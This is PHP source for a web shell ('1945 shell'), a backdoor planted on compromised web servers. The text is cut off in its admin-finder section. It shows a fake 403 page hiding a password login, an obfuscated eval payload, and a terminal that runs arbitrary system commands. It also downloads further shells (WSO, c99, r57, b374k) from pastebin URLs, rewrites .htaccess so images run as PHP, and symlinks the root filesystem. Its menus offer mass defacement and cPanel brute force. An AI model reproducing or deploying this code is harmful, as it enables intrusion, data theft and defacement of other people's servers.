<?php
// 1945 shell , c0ded by : shutdown57
// for update   : http://pastebin.com/ZA04jg7A 
// more info    : www.withoutshadow.org | wos-linuxers.blogspot.com
// contact      : woslinuxers57799@gmail.com
// LIMITED AND COMPRESSED EDITION
error_reporting(0);
set_time_limit(0);
session_start();
$s57_paswot = "gfus";//default password : gfus

$alert="<script>
window.location.href='?45=".$_GET['act']."';
</script>";
@define('judul', 'freedom is real - 1945');
@define('icons', 'http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif');
@define('icon_folder','<img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA'.'AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp'.'/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=">');
@define('icon_file','<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=">');


if(!isset($_SESSION['fz'])){
	$fz="13";
}else{
	$fz=$_SESSION['fz'];
}
if(!isset($_SESSION['bg'])){
	$bg="#000000";
}else{
	$bg=$_SESSION['bg'];
}
if(!isset($_SESSION['col'])){
	$col="#FF0000";
}else{
	$col=$_SESSION['col'];
}
if(!isset($_SESSION['pcol'])){
	$pcol="";
}else{
	$pcol=$_SESSION['pcol'];
}
if(isset($_SESSION['responsive'])){
	$resmod='<a href="?act='.$_GET['45'].'&mobile_off='.$_GET['45'].'">[ON]</a>';
}else{
	$resmod='<a href="?act='.$_GET['45'].'&mobile='.$_GET['45'].'">[OFF]</a>';
}
if(isset($_POST['submitfz'])){
	$_SESSION['fz']=$_POST['fz'];
	echo"<meta http-equiv='refresh' content='0;URL=?font-size=".$_SESSION['fz']."'>";
}
if(isset($_POST['submitbg'])){
	$_SESSION['bg']=$_POST['bgcolor'];
	echo"<meta http-equiv='refresh' content='0;URL=?bgcolor=".$_SESSION['bg']."'>";
}
if(isset($_POST['submitcol'])){
	$_SESSION['col']=$_POST['color'];
	echo"<meta http-equiv='refresh' content='0;URL=?font-color=".$_SESSION['col']."'>";
}
if(isset($_POST['submitpc'])){
	$_SESSION['pcol']=$_POST['pcolor'];
echo"<meta http-equiv='refresh' content='0;URL=?public-font-color=".$_SESSION['pcol']."'>";
}
function shutdown57_login() { 
echo"
<title> Forbidden</title>
</head><body>
<div id='forbid'>
<h1>Forbidden</h1>

<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.<br>
Server unable to read htaccess file, denying access to be safe
<br><br>
Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p></div>";

if($_GET['login']=='1945'){

    echo'
<style>
body{
background:#000;
backgroud-size:100%;
}
input{
text-align:center;
border-top:3px solid #f00;
border-left:3px solid #f00;
border-bottom:3px solid #fff;
border-right:3px solid #fff;
background:transparent;
color:#333;
}
input:hover{
transition-duration:0.5s;
-o-transition-duration:0.5s;
-moz-transition-duration:0.5s;
-webkit-transition-duration:0.5s;
border-style:dashed;
cursor:pointer;
}
#forbid{
	display:none;
}
table{
	margin-top:200px;
}
</style>
<center>
<form method="post">
<table title="selamat datang '.$_SERVER['REMOTE_ADDR'].' di 1945 shell ">
<tr><td colspan=2><h1 style="color:red;text-shadow:2px 3px 5px #fff;"><center>[ 1945 ]</h1><br><font color=white> <center>"WELCOME <b>'.$_SERVER['REMOTE_ADDR'].'</b> TO 1945 shell at '.$_SERVER['HTTP_HOST'].' "</font></td></tr>
<tr><td><font color=red size=5 face=courier new> Username :</font></td><td>
<input type="text" value="WithOutShadow" title="you can\'t change this username." disabled></td></tr>
<tr><td><font color=white size=5 face=courier new>Password :</font></td><td>
<input type="password" name="pass" ></td></tr>
<tr><td colspan=2><input type="submit" value="login!" style="width:100%;color:white;"></td></tr>
</table>
<footer style="bottom:0;left:0;position:fixed;color:#fff">powered by withoutshadow </footer>
  </center> 
    ';
}    
    exit; 
} 


if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $s57_paswot ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $s57_paswot) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        shutdown57_login();
 
   @eval(str_rot13(gzinflate(str_rot13(base64_decode("ZqjKK6vUQ89XV6ssWMzILldaMzU3t7RnKAGJ6xUkSKnrqFSnFaUnpSqklRZISSoYTZqYxgIFPVwjFawU1PVH4t2CXD2DXKPVUN3dneNQndzc1XD11PWRclyDXDyC3NzjPVzDQGUKzn5hYV5BroEQA4A2xifnpXIlpeupAw3OK6wqWGcoVlcqqSwCO0DTGgA=")))));

?>
<!DOCTYPE html>
<html>
<head>
	<title>.[ <?=judul;?> ].</title>
	<link rel="shortcut icon" href="<?=icons;?>">
	<?php
	if(isset($_SESSION['responsive'])){
		echo $_SESSION['responsive'];
	}
	?>
</head>
<body>
<style type="text/css">
*{
	font-size:<?=$fz;?>;
	color:<?=$pcol;?>;
	font-family:arial;
}
body{background:<?=$bg;?>;color:<?=$col;?>;}
a{color:#eee;text-decoration: none;}
a:hover{color:#f00;border-bottom: 1px solid #fff;}
input,option,select{color: #f00;border:1px solid #eee;background:transparent;}
textarea{width:80%;height: 500px;background: #000;color: #f00;border:1px solid #eee;}
textarea:hover,input:hover,option:hover,select:hover{border:1px solid #f00;color: #eee;}
table{border-collapse: collapse;}
.tbl_exp{width: 100%;border-collapse: collapse;border:0;font-size: 14px;margin-bottom: 100px;}
.hover:hover{background: #333;}
.hover{border-bottom: 1px solid grey;}
.header #right{text-align:right;float: right;}
.header #left{text-align: left;float: left;}
#viewimg{margin-top:150px;text-align: center;}
#thead{background: #f00;color: #fff;}
.code{border: 1px solid #fff;width: 80%;text-align: left;font-size: 13px;}
.header{width: 100%;}
</style>

<table class="header">
<tr><td>
<?php

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm= ini_get('safe_mode') ? "<font color=lime> ON<?font>" : "<font color=grey> OFF</font>";
$mysql= function_exists('mysql_connect')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$url_fp =ini_get('url_fopen')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$curl=function_exists('curl_init')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$df=ini_get('disable_functions') ? substr(ini_get('disable_functions'),0,50).",etc..." : "<font color=grey> NONE</font>";
echo "
<div id='left'>
<pre style='font-size:13px;'>
SERVER SOFTWARE : ".$_SERVER['SERVER_SOFTWARE']."
UNAME : ".php_uname()."
HOSTNAME : ".$_SERVER['HTTP_HOST']."
IP SERVER : ".gethostbyname($_SERVER['HTTP_HOST'])." | YOUR IP : ".$_SERVER['REMOTE_ADDR']." 
User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")
PHP version : ".phpversion()."-[<a href='?act=".getcwd()."&phpinfo=busuK_tampilanNya_kembali_aja'>PHPINFO</a>]
CURL:".$curl."|safemode:".$sm."|URL FOPEN:".$url_fp."|MySQL:".$mysql."
DISABLE FUNCTIONS :".$df."
current dir :";
if(isset($_GET['45'])){
	$d=$_GET['45'];
}else{
	if(isset($_GET['act'])){
$d=$_GET['act'];
}else{
$d=getcwd();

}
}
$d=str_replace('\\','/',$d);
$path = explode('/',$d);

foreach($path as $id=>$curdir){
if($curdir == '' && $id == 0){
$a = true;
echo '<a href="?45=/">/</a>';
continue;
}
if($curdir == '') continue;
echo '<a href="?45=';
for($i=0;$i<=$id;$i++){
echo "$path[$i]";
if($i != $id) echo "/";
}
echo '">'.$curdir.'</a>/';
}
$pwd=str_replace('\\','/',getcwd());
(is_writable($d))?$stat="<font color=lime>WRITABLE</font>" :$stat="<a style='color:grey' href='?act=".$_GET['45']."&notw=".$_GET['45']."'>NOT WRITABLE</a>";

?>
~[<?php echo $stat;?>][<a href="?45=<?php echo $pwd; ?>">home</a>][<a href="javascript:history.go(-1);">back</a>]
</div>
</td><td>
<div id='right'>
<center>
--<[<a href="?act=<?php echo $d;?>&about=<?php echo $d;?>">1945 SHELL</a>|<a href="?act=<?=$d;?>&theme=<?=$d;?>">THEMES</a>|<a href="?act=logout">LOGOUT</a>]--[
</center>
<br>
[<a href="?act=<?php echo $d;?>&newfile=<?php echo $d;?>">Newfile</a>]
[<a href="?act=<?php echo $d;?>&mkdir=<?php echo $d;?>">NewDir</a>]
[<a href="?act=<?php echo $d;?>&shell=<?php echo $d;?>">Shell</a>]
[<a href="?act=<?php echo $d;?>&conf=<?php echo $d;?>">config grab</a>]
[<a href="?act=<?php echo $d;?>&admfind=<?php echo $d;?>">Admin finder</a>]
<br>
[<a href="?act=<?php echo $d;?>&upload=<?php echo $d;?>">Upload</a>]
[<a href="?act=<?php echo $d;?>&unzip=<?php echo $d;?>">Unzip file</a>]
[<a href="?act=<?php echo $d;?>&stringtools=<?php echo $d;?>">String Tools</a>]
[<a href="?act=<?php echo $d;?>&kuchiyose=<?php echo $d;?>">Kuchiyose no jutsu</a>]
[<a href="?act=<?php echo $d;?>&copy=<?php echo $d;?>">Copy</a>]
<br>
[<a href="?act=<?php echo $d;?>&ctools=<?php echo $d;?>">Create tools</a>]
[<a href="?act=<?php echo $d;?>&mail=<?php echo $d;?>">Mail sender</a>]
[<a href="?act=<?php echo $d;?>&massdeface=<?php echo $d;?>">Mass deface</a>]
[<a href="?act=<?php echo $d;?>&zoneh=<?php echo $d;?>">Zone-H</a>]
[<a href="?act=<?php echo $d;?>&cpbrute=<?php echo $d;?>">cPanel bruteforce</a>]
<br><br>
<form method="get">
Go to dir:<input type="text" name="45" value="<?php echo $d;?>" style="width:250px">
<input type="submit" value=">>">
</form>
</div>
</td></tr></table>
<?php

if(isset($_GET['act'])){
	//Kuchiyose tools
$k=array(
	'adminer'=>"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
	'wso'=>"http://pastebin.com/raw/N0eh3Q7Y",
	'whmcs'=>"http://pastebin.com/raw/TjiXt4r1",
	'bejak'=>"http://pastebin.com/raw/sQJVES6y",
	'terminal'=>'http://pastebin.com/raw/2ADSfZYk',
	'pastebin'=>'http://pastebin.com/raw/RCbhjsXJ',
	'indoxploit_shell'=>'http://pastebin.com/raw/nC6pWh5a',
	'andela'=>'http://pastebin.com/raw/0dkmjaWJ',
	'injection'=>'http://pastebin.com/raw/znH7r6Jr',
	'sbh'=>'http://pastebin.com/raw/SMDJVTF8',
	'bh'=>'http://pastebin.com/raw/3L2ESWeu',
	'jkt48'=>'http://pastebin.com/raw/TujADXPn',
	'c99'=>'http://pastebin.com/raw/Ms0ptnpH',
	'r57'=>'http://pastebin.com/raw/S9tzBgg3',
	);
function kuchiyose($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if($_GET['kuchiyose']=='adminer'){
if(file_exists('1945_adminer.php')){
	echo" done!! => <a href='1945_adminer.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['adminer'],'1945_adminer.php')){
			echo"done!! --> <a href='1945_adminer.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif($_GET['notw']){
if(chmod($_GET['notw'],0777)){
	echo"<script>
	alert('chmod successfull..');
	window.location.href='?45=".$_GET['notw'];
}else{
	echo"
	<script>
	alert('gagal CHMOD Directory :( ');
	</script>";
}
}elseif ($_GET['kuchiyose']=='wso') {
	if(file_exists('1945_wso.php')){
	echo" done!! => <a href='1945_wso.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['wso'],'1945_wso.php')){
			echo"done!! --> <a href='1945_wso.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='whmcs') {
	if(file_exists('1945_whmcs.php')){
	echo" done!! => <a href='1945_whmcs.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['whmcs'],'1945_whmcs.php')){
			echo"done!! --> <a href='1945_whmcs.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='bejak') {
if(file_exists('1945_b374k.php')){
	echo" done!! => <a href='1945_b374k.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['bejak'],'1945_b374k.php')){
			echo"done!! --> <a href='1945_b374k.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='bypass_shell') {
	$isi="\n Addhandler application/x-httpd-php .jpg";

	$fp=fopen('.htaccess','a+');
	if(fwrite($fp,$isi)){
		if(rename($_SERVER['SCRIPT_FILENAME'],"1945.jpg")){
			echo"
			<script>
			alert('berhasil kakak!!');
			window.location.href='1945.jpg'
			</script>";
		}
	}
	fclose($fp);
}elseif ($_GET['kuchiyose']=='terminal') {
if(file_exists('1945_b374k.php')){
	echo" done!! => <a href='1945_terminal.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['terminal'],'1945_terminal.php')){
			echo"done!! --> <a href='1945_terminal.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='pastebin') {
if(file_exists('1945_pastebin.php')){
	echo" done!! => <a href='1945_pastebin.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['pastebin'],'1945_pastebin.php')){
			echo"done!! --> <a href='1945_pastebin.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='indoxploit_shell') {
if(file_exists('1945_indoXploit_shell.php')){
	echo" done!! => <a href='1945_indoXploit_shell.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['indoxploit_shell'],'1945_indoxploit_shell.php')){
			echo"done!! --> <a href='1945_indoxploit_shell.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='andela') {
if(file_exists('1945_andela.php')){
	echo" done!! => <a href='1945_andela.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['andela'],'1945_andela.php')){
			echo"done!! --> <a href='1945_andela.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='injection') {
	if(file_exists('1945_1n73ction.php')){
	echo" done!! => <a href='1945_1n73ction.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['injection'],'1945_1n73ction.php')){
			echo"done!! --> <a href='1945_1n73ction.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='sbh') {
	if(file_exists('1945_sbh.php')){
	echo" done!! => <a href='1945_sbh.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['sbh'],'1945_sbh.php')){
			echo"done!! --> <a href='1945_sbh.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='bh') {
	if(file_exists('1945_bh.php')){
	echo" done!! => <a href='1945_bh.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['bh'],'1945_bh.php')){
			echo"done!! --> <a href='1945_bh.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='jkt48') {
	if(file_exists('1945_jkt48.php')){
	echo" done!! => <a href='1945_jkt48.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['jkt48'],'1945_jkt48.php')){
			echo"done!! --> <a href='1945_jkt48.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='c99') {
	if(file_exists('1945_c99.php')){
	echo" done!! => <a href='1945_c99.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['c99'],'1945_c99.php')){
			echo"done!! --> <a href='1945_c99.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}elseif ($_GET['kuchiyose']=='r57') {
	if(file_exists('1945_r57.php')){
	echo" done!! => <a href='1945_r57.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['r57'],'1945_r57.php')){
			echo"done!! --> <a href='1945_r57.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	}
}
elseif ($_GET['kuchiyose']=='root') {
system('ln -s / 1945~.txt'); 
$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Mauritania = symlink("/","1945~.txt"); 
$rt="<br><a href='1945~.txt' TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
berhasil kakak! touch me senpai..</b></font></a></center>"; 
echo "<center><br><br><b>Done.. !</b><br>".$rt;
echo "</form>"; 
}
elseif(isset($_GET['rmdir'])){
	//membuat fungsi penghapusan folder yang di dalamNya ada file dan folder kosong :)
	//c0ded by : alinko
	function rmdir_unlink_rmdir($d){
		if(!rmdir($d)){
		$s=scandir($d);
		foreach ($s as $ss) {
			if(is_file($d."/".$ss)){
				if(unlink($d."/".$ss)){
					rmdir($d);
					
				}
			}
			if(is_dir($d."/".$ss)){
				rmdir($d."/".$ss);
				rmdir($d);
				
			}
		}
	}
	}
	if(rmdir_unlink_rmdir($_GET['rmdir'])){
		echo $alert;
	}else{
		echo $alert;
	}
}elseif(isset($_GET['rm'])){
	$rm=$_GET['rm'];
	if(unlink($rm)){
		echo $alert;
	}
}elseif(isset($_GET['rename'])){
	echo"
	<br><br><br><br>
	<center>
	<form method='post' >
	<p>Old name : ".basename($_GET['rename'])."</p>
	NewName :
	<input type='text' name='newname' value='".$_GET['rename']."'><input type='submit' value='>>'>
	</form>";
	if(isset($_POST['newname'])){
		$oldname=$_GET['rename'];
		$newname=$_POST['newname'];
		if(rename($oldname,$newname)){
			echo $alert;
		}
	}
}elseif (isset($_GET['edit'])) {
	echo"
	<center>
	<form method='post' >
	<textarea name='edit'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea>
	<br>
	<input type='text' name='editdir' value='".$_GET['edit']."' style='width:350px'><input type='submit' name='editsave' value='save' >
	</form>";
	if(isset($_POST['editsave'])){
		$fp=fopen($_POST['editdir'],'w');
		if(fwrite($fp,$_POST['edit'])){
			echo"<br> saved@".date('D M Y');
		}
		fclose($fp);
	}
}elseif (isset($_GET['chmod'])) {
	echo"<center>
	<h3>: change permission files :</h3>
	<form method='post' >
	Permission :
	<input type='text' name='perms' value='".fileperms($_GET['chmod'])."'><input type='submit' value='>>'>
	</form>";
	if(isset($_POST['perms'])){
		if(chmod($_GET['chmod'],$_POST['perms'])){
			echo'Permission changed! <a href="javascript:history.go(-1)">back</a>';
		}
	}
}elseif (isset($_GET['src'])) {

echo'
<table>
<tr><td>[<a href="?act='.$_GET['act'].'&edit='.$_GET['src'].'">edit</a>]</td><td>
[<a href="?act='.$_GET['act'].'&rm='.$_GET['src'].'">delete</a>]</td><td>
[<a href="?act='.$_GET['act'].'&rename='.$_GET['src'].'">rename</a>]</td><td>
[<a href="?act='.$_GET['act'].'&chmod='.$_GET['src'].'">chmod</a>]</td><td>
[<a href="?act='.$_GET['act'].'&download='.$_GET['src'].'">download</a>]</td></tr></table>
<center>
<h3>: View file :</h3>
<p>Current file: <font color=white>'.$_GET['src'].'</font></p>
';
	$src=$_GET['src'];
	$get_basename=basename($src);
	$a=preg_match('/.jpg/',$get_basename);
    $b=preg_match('/.png/',$get_basename);
    $c=preg_match('/.gif/',$get_basename);
    $cwd=str_replace('\\','/',getcwd());
	$plc=str_replace($cwd,'',$src);

	if($c||$b||$a){
		echo"
		<br>
	<center>
		<img src='".$plc."' id='viewimg' />";
	}else{
		$f=$_GET['src'];
		$file = wordwrap(file_get_contents($f),160,"\n",true);
				$a= highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("81FF00","e1e1e1", "333333", "ffffff" , "FF8000");
				$a= str_ireplace($old,$new, $a);
				$result = $a;

	echo'

	<pre class="code">'.$result.'</pre>';
}
}elseif (isset($_GET['upload'])) {
	if(isset($_POST['upfile'])){
	$files = array(
		            '1' => $_FILES['files']['name'], 
		            '2' => $_FILES['files2']['name'],
		            '3' => $_FILES['files3']['name'],
		            '4' => $_FILES['files4']['name'],
		            '5' => $_FILES['files5']['name']
		            );
	$tmp= array(
		'1' => $_FILES['files']['tmp_name'],
		'2' => $_FILES['files2']['tmp_name'],
		'3' => $_FILES['files3']['tmp_name'],
		'4' => $_FILES['files4']['tmp_name'],
		'5' => $_FILES['files5']['tmp_name']
		);
	$dir=array(
		'1' => $_POST['dir']."/",
		'2' => $_POST['dir2']."/",
		'3' => $_POST['dir3']."/",
		'4' => $_POST['dir4']."/",
		'5' => $_POST['dir5']."/"
		);
	if(move_uploaded_file($tmp['1'],$dir['1'].$files['1'])){
echo"<br>uploaded -->".$dir['1'].$files['1'];
	}
	if(move_uploaded_file($tmp['2'],$dir['2'].$files['2'])) {
	echo"<br> uploaded --> ".$dir['2'].$files['2'];
	}
	if(move_uploaded_file($tmp['3'],$dir['3'].$files['3'])){
		echo"<br>uploaded --> ".$dir['3'].$files['3'];
	}
	if(move_uploaded_file($tmp['4'],$dir['4'].$files['4'])){
		echo"<br>uploaded --> ".$dir['4'].$files['5'];
	}
	if(move_uploaded_file($tmp['5'],$dir['5'].$files['5'])){
		echo"<br>uploaded --> ".$dir['5'].$files['5'];
	}

	echo"<br>
	<font color=white>Success... berhasil dengan tamvanz :)</font>";
}
if(is_writable($_GET['upload'])){
	$stat='<font color="lime">Writable(bisa)</font>';
}else{
	$stat='<font color="grey">Not Writable(gak bisa)</font>';
}
	?>
	<center>
	<h3>: MultiUpload Files :</h3>
	<p> status upload file : <?php echo $stat;?></p>
	<font color=white>NB : kosongkan jika tidak perlu </font>
	<table border=1><tr><td>file</td><td>Target Dir</td></tr>
	<tr><td>
	<form method="Post" enctype="multipart/form-data">
	<input type="file" name="files" ></td><td>
	<input type="text" name="dir" value="<?php echo $_GET['upload']; ?>" >
	</td></tr><tr><td>
	<input type="file" name="files2" ></td><td>
	<input type="text" name="dir2" value="<?php echo $_GET['upload']; ?>" >
	</td></tr><tr><td>
	<input type="file" name="files3"  ></td><td>
	<input type="text" name="dir3" value="<?php echo $_GET['upload']; ?>" >
	</td></tr><tr><td>
	<input type="file" name="files4" ></td><td>
	<input type="text" name="dir4" value="<?php echo $_GET['upload']; ?>" >
	</td></tr><tr><td>
	<input type="file" name="files5"></td><td>
	<input type="text" name="dir5" value="<?php echo $_GET['upload']; ?>">
</td></tr></table>
<br>
		<input type="submit" name="upfile" class="btn btn-primary" value="upload all">
	
	</form>
	</center>
	<?php
}elseif (isset($_GET['mkdir'])) {
	echo'
	<center>
<h3>: New Directory :</h3>
	<form method="post">
	newdir:<input type="text" name="mkdir" value="'.$_GET['mkdir'].'/newdir" style="width:200px;">
	<input type="submit" value=">>">
	</form>';
	if(isset($_POST['mkdir'])){
		if(mkdir($_POST['mkdir'])){
			echo $alert;
		}
	}
}elseif (isset($_GET['newfile'])) {
echo'
	<center>
<h3>: Newfile :</h3>
	<form method="post">
	<textarea name="newfile"> </textarea>
	<br>
	save :<input type="text" name="saveas" value="'.$_GET['newfile'].'/new.php" style="width:60%">
	<input type="submit" value=">>" name="subfile">
	</form><br><br><br>';
	if(isset($_POST['subfile'])){
		$fp=fopen($_POST['saveas'],'w');
		if(fwrite($fp,$_POST['newfile'])){
			echo $alert;
		}
		fclose($fp);
	}
}elseif (isset($_GET['shell'])) {
	echo'
	<center>
<fieldset style="border-collapse:collapse;height:500px;">
<legend>Terminal</legend>
	<form method="post">
	<div style="float:left;text-align:left">
	'.$user.'@<font color=white>'.$_SERVER['HTTP_HOST'].'</font><font color=lime> '.$_GET['shell'].'</font> #:<input type="text" name="command" style="border:0;width:400px;max-width:relative;">
	</div>
	</form>';
	if(isset($_POST['command'])){
		if(function_exists('shell_exec')){
			$cmd=shell_exec($_POST['command']);
		}else{
			if(function_exists('exec')){
				$cmd=exec($_POST['command']);
			}else{
				if(function_exists('system'));
				$cmd=system($_POST['command']);
			}
		}
		echo'
		<br>
	
		<textarea style="color:lime;text-align:left;width:100%;height:90%;border:0;resize:none;" readonly>
		'.$cmd.'</textarea></fieldset>';
	}
}elseif (isset($_GET['admfind'])) {
?>
<center>
<h3>: admin finder :</h3>
<form method="POST" action="">
site : 
<input type="text" name="url" style="width:260px" value="http://"/>

<input type="submit" name="submit" value="find[!]" />
</p>
<br>
<br>

<?php

function xss_protect($data, $strip_tags = false, $allowed_tags = "") { 
    if($strip_tags) {
  $data = strip_tags($data, $allowed_tags . "<b>");
    }

    if(stripos($data, "script") !== false) { 
  $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); 
    } else { 
  $result = htmlentities($data, ENT_QUOTES); 
    } 

    return $result;
}
function urlExist($url)
{
    $handle   = curl_init($url);
    if (false === $handle)
    {
    return false;
    }
    curl_setopt($handle, CURLOPT_HEADER, false);
    curl_setopt($handle, CURLOPT_FAILONERROR, true);
    curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); // request as if Firefox
    curl_setopt($handle, CURLOPT_NOBODY, true);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
    $connectable = curl_exec($handle);
    curl_close($handle);
    return $connectable;
}
    if(isset($_POST['submit']) && isset($_POST['url']))
    {
  $url= htmlentities(xss_protect($_POST['url']));
  if(filter_var($url, FILTER_VALIDATE_URL))
  {
    $trying = array(':2082',':2083','a_admins/','admin/','adminweb/','po-admin','index.php?q=admin','administrator/','admin/admin.php','cpanel','admin3/','admin4/','admin5/','usuarios/',
    'usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/',
    'panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php',
    'admin/index.php','admin/login.php','admin/admin.php','admin/account.php','admin_area/admin.php',
    'admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html',
    'admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php',
    'bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php',
    'admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html',
    'panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php',
    'nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php',
    'administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html',
